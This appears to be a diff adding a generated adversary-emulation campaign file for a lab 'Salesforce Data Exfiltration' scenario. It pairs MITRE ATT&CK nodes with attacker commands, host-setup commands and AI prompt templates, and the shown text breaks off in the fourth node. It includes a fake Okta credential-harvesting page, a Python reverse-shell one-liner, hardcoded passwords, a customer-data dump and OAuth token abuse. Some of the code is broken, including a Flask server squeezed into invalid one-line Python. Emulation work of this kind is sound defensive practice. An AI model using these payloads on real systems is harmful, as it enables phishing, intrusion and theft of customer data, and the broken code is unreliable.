@@ -1,0 +1,1927 @@
+{
+  "campaign_name": "Salesforce Data Exfiltration",
+  "campaign_file": "data/caldera_adversaries/0.salesforce_data_exfiltration.yml",
+  "generated_at": "2026-03-11T18:01:42.830855",
+  "metadata": {
+    "total_techniques": 18,
+    "nodes_generated": 18,
+    "validation": {
+      "is_dag": true,
+      "cycle_detected": false,
+      "cycle_nodes": [],
+      "validation_rules": {
+        "no_cycles": true,
+        "no_dangling_nodes": true,
+        "ordering_preserved": true
+      },
+      "violations": []
+    }
+  },
+  "structural_nodes": [
+    {
+      "node_id": "5521de91-f38d-441f-8218-ade93a12dfa7",
+      "node_index": 0,
+      "node_type": "structural",
+      "technique_id": "T1608.005",
+      "technique_name": "Link Target",
+      "tactic": "resource-development",
+      "description": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors established an Okta phishing panel which victims were tricked into accessing from mobile phones or work computers during social engineering calls.",
+      "required_prerequisites": [],
+      "provides": [
+        "resources",
+        "infrastructure"
+      ],
+      "attacker_commands": [
+        "curl http://172.21.0.20/ > okta_fake_login.html && echo \"Send the link http://172.21.0.20/ to target users for credential harvesting\""
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y apache2 && echo '<!DOCTYPE html><html><head><title>Okta Login</title></head><body><h1>Sign in to your account</h1><form action=\"/submit\" method=\"POST\"><label for=\"username\">Username:</label><input type=\"text\" id=\"username\" name=\"username\"><br><label for=\"password\">Password:</label><input type=\"password\" id=\"password\" name=\"password\"><br><input type=\"submit\" value=\"Sign In\"></form></body></html>' > /var/www/html/index.html && echo '#!/bin/bash\\nread user pass\\necho \"User: $user Pass: $pass\" >> /var/www/html/creds.txt\\necho \"Thank you for signing in.\"' > /var/www/html/submit && chmod +x /var/www/html/submit && /usr/sbin/apache2ctl -D FOREGROUND &"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [],
+      "child_nodes": [
+        "6abc9383-e24f-4126-a5a2-8a3737fc2ebf"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1608.005 - Link Target\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors established an Okta phishing panel which victims were tricked into accessing from mobile phones or work computers during social engineering calls.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "6abc9383-e24f-4126-a5a2-8a3737fc2ebf",
+      "node_index": 1,
+      "node_type": "structural",
+      "technique_id": "T1059.006",
+      "technique_name": "Python",
+      "tactic": "execution",
+      "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors used custom applications developed in python.",
+      "required_prerequisites": [
+        "need:execution_vector",
+        "access:initial"
+      ],
+      "provides": [
+        "execution_capability",
+        "code_execution"
+      ],
+      "attacker_commands": [
+        "sshpass -p Password123! ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('172.22.0.20',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('/bin/sh')\""
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y python3 python3-pip && useradd -m attacker && echo attacker:Password123! | chpasswd && mkdir -p /home/attacker && chown attacker:attacker /home/attacker"
+      ],
+      "target_vuln_host_b": [
+        "apt-get update && apt-get install -y python3 python3-pip && useradd -m attacker && echo attacker:Password123! | chpasswd && mkdir -p /home/attacker && chown attacker:attacker /home/attacker"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "5521de91-f38d-441f-8218-ade93a12dfa7"
+      ],
+      "child_nodes": [
+        "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1059.006 - Python\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors used custom applications developed in python.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "need:execution_vector",
+        "access:initial"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6",
+      "node_index": 2,
+      "node_type": "structural",
+      "technique_id": "T1213.004",
+      "technique_name": "Customer Relationship Management Software",
+      "tactic": "collection",
+      "description": "Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.\nOnce adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized Phishing emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations.\nCRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors accessed and exfiltrated sensitive information from compromised Salesforce instances.",
+      "required_prerequisites": [
+        "data:available",
+        "access:target"
+      ],
+      "provides": [
+        "collected_data"
+      ],
+      "attacker_commands": [
+        "curl http://172.21.0.20/crm.php"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update;apt-get install -y apache2 php php-mysql mysql-server wget;service apache2 start;service mysql start;mysql -e \"CREATE DATABASE crm;CREATE USER 'crmuser'@'localhost' IDENTIFIED BY 'CrmPass123';GRANT ALL PRIVILEGES ON crm.* TO 'crmuser'@'localhost';FLUSH PRIVILEGES;\";printf '<?php $conn = new mysqli(\"localhost\",\"crmuser\",\"CrmPass123\",\"crm\");if($conn->connect_error){die(\"Connection failed: \".$conn->connect_error);} $result = $conn->query(\"CREATE TABLE IF NOT EXISTS customers (id INT AUTO_INCREMENT PRIMARY KEY,fullname VARCHAR(100),email VARCHAR(100),phone VARCHAR(20),address TEXT,purchase_history TEXT,it_support_interactions TEXT)\"); $conn->query(\"INSERT INTO customers (fullname,email,phone,address,purchase_history,it_support_interactions) VALUES (\\\"John Doe\\\",\\\"john.doe@example.com\\\",\\\"555-1234\\\",\\\"1234 Elm St\\\",\\\"Order #1234\\\",\\\"Ticket #5678\\\")\"); echo json_encode($conn->query(\"SELECT * FROM customers\")->fetch_all(MYSQLI_ASSOC)); $conn->close();?>' > /var/www/html/crm.php;killall apache2; /usr/sbin/apache2ctl -D FOREGROUND &"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "6abc9383-e24f-4126-a5a2-8a3737fc2ebf"
+      ],
+      "child_nodes": [
+        "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1213.004 - Customer Relationship Management Software\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors accessed and exfiltrated sensitive information from compromised Salesforce instances.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.\nOnce adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized Phishing emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations.\nCRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "data:available",
+        "access:target"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9",
+      "node_index": 3,
+      "node_type": "structural",
+      "technique_id": "T1671",
+      "technique_name": "Cloud Application Integration",
+      "tactic": "persistence",
+      "description": "Adversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends.\nOAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks. \nLeveraging application integrations may allow adversaries to persist in an environment – for example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account. In some cases, integrations may remain valid even after the original consenting user account is disabled. Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use of Application Access Tokens. Finally, they may enable persistent Automated Exfiltration over time.\nCreating or adding a new application may require the adversary to create a dedicated Cloud Account for the application and assign it Additional Cloud Roles – for example, in Microsoft 365 environments, an application can only access resources via an associated service principal.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors deceived victims into authorizing malicious connected apps to their organization's Salesforce portal.",
+      "required_prerequisites": [
+        "access:initial",
+        "capability:write_to_persistence_locations"
+      ],
+      "provides": [
+        "persistent_access"
+      ],
+      "attacker_commands": [
+        "curl -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://172.21.0.20:8080/oauth/authorize && TOKEN=$(curl -s -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://172.21.0.20:8080/oauth/authorize | jq -r '.access_token') && curl -H \"Authorization: Bearer $TOKEN\" http://172.21.0.20:8080/data"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y python3 python3-pip wget curl && pip install --break-system-packages flask requests && useradd -m -s /bin/bash oauthapp && mkdir -p /home/oauthapp/app && printf 'from flask import Flask, request, jsonify; app = Flask(__name__); tokens = {}; @app.route(\"/oauth/authorize\", methods=[\"POST\"]); def authorize(): data = request.json; tokens[data[\"client_id\"]] = \"access_token_\"+data[\"client_id\"]; return jsonify({\"access_token\": tokens[data[\"client_id\"]]}), 200; @app.route(\"/data\", methods=[\"GET\"]); def data(): auth = request.headers.get(\"Authorization\"); if auth and auth.startswith(\"Bearer \"): token = auth.split()[1]; if token in tokens.values(): return jsonify({\"data\":\"sensitive_data_for_\"+token}), 200; return jsonify({\"error\":\"Unauthorized\"}), 401; if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=8080)' > /home/oauthapp/app/server.py && chown -R oauthapp:oauthapp /home/oauthapp && su - oauthapp -c \"nohup python3 /home/oauthapp/app/server.py &\""
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6"
+      ],
+      "child_nodes": [
+        "895d1ea1-1841-476e-85af-5144bfef843b"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1671 - Cloud Application Integration\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the 